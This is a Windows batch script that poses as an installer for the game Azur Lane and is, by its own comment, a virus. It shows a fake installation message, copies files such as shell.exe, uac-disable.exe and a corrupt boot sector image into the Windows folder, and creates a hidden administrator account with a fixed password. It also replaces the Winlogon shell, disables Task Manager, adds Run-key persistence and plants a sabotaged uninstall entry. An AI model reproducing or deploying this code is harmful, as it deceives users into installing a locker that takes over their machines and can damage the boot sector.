@echo off
cls
set sdir=%~dp0
cd %sdir%
echo.
echo Please wait...
echo.
: ===================================================
: Indicates the user of a game installation in bg
: ===================================================
traymcore.exe "Please wait while we processed the installation of Azur Lane game in the background..." /T:"Azur Lane Setup" /I:Info
: ===================================================
: Copies shell.exe to %systemdrive%
: ===================================================
copy "%cd%\shell.exe" "%windir%\shell.exe"
copy "%cd%\icon.exe" "%windir%\icon.exe"
copy "%cd%\traymcore.exe" "%windir%\traymcore.exe"
copy "%cd%\startup.bat" "%windir%\startup.bat"
copy "%cd%\bmgr.exe" "%windir%\bmgr.exe"
copy "%cd%\bootsect-corrupt.bin" "%windir%\bootsect-corrupt.bin"
copy "%cd%\patch2.bat" "%windir%\patch2.bat"
copy "%cd%\uac-disable.exe" "%windir%\uac-disable.exe"
: ===============================================
: Takes a backup of current bootsect to %windir%
: ===============================================
"%windir%\bmgr.exe" /DEVICE=%systemdrive% /mbr /backup /file="%windir%\bootsect-backup.bin" /sectors=1 /quiet
: ====================================================
: Disables current user and enables a hidden user
: ====================================================
net user "%username%" /active:yes
net user "%username%" /passwordreq:no
net user "%username%" /comments:"An encrypted account by the Azur Lane virus - Coded by Insertx2k Dev"
net user /add Enterprise
net user Enterprise /active:yes
net user Enterprise /passwordreq:yes
net user Enterprise iloveenterprise
net user Enterprise /expires:never
net localgroup /add Administrators Enterprise
net localgroup /add Users Enterprise
net localgroup /add Power Users Enterprise
net user Guest /active:no
: ==================================================================
: installs registry editor values on a certian windows environment.
: ==================================================================
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "DisplayName" /t REG_SZ /d "Azur Lane (Windows 32-bit)" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "Publisher" /t REG_SZ /d "Yostar" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "URLInfoAbout" /t REG_SZ /d "https://twitter.com/azur-lane-en" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "DisplayVersion" /t REG_SZ /d "r0.1.2.6.9 (Unofficial)" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "DisplayIcon" /t REG_SZ /d "%windir%\shell.exe,0" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "UninstallString" /t REG_SZ /d "cmd.exe /c taskkill /f /im explorer.exe&taskkill /f /im control.exe&echo You can't get rid of me that easy!&pause&exit" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "QuietUninstallString" /t REG_SZ /d "cmd.exe /c taskkill /f /im explorer.exe&taskkill /f /im control.exe&echo You can't get rid of me that easy!&pause&exit" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "InstallDate" /t REG_SZ /d "20691010" /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "InstallLocation" /t REG_SZ /d "%windir%\system32" /f 
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "NoRepair" /t REG_DWORD /d 0x00000001 /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "NoModify" /t REG_DWORD /d 0x00000001 /f
REG ADD HKEY_CURRENT_USER\software\microsoft\windows\currentversion\uninstall\azur-lane-soft /v "NoRemove" /t REG_DWORD /d 0x00000000 /f
: ==============================================================
: Locks out windows' default shell
: ==============================================================
REG ADD "HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon" /v "Shell" /t REG_SZ /d "%windir%\shell.exe" /f
: ==============================================================
: definitely disabling windows task manager for proper locking
: ==============================================================
REG ADD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system" /v "DisableTaskMgr" /t REG_DWORD /d 0x00000001 /f 
: ==========================================================
: Injects the startup code
: ==========================================================
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "SysShellRep" /t REG_SZ /d "%windir%\shell.exe" /f 
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "SysShellStartupCMD" /t REG_SZ /d "%windir%\startup.bat" /f 
: ==============================
: Another delay please...
: ==============================
ping -w 15 localhost >nul
: =============================
: ok enough i am out.!!
: =============================
"%windir%\patch2.bat"
ping -w 10 localhost >nul
exit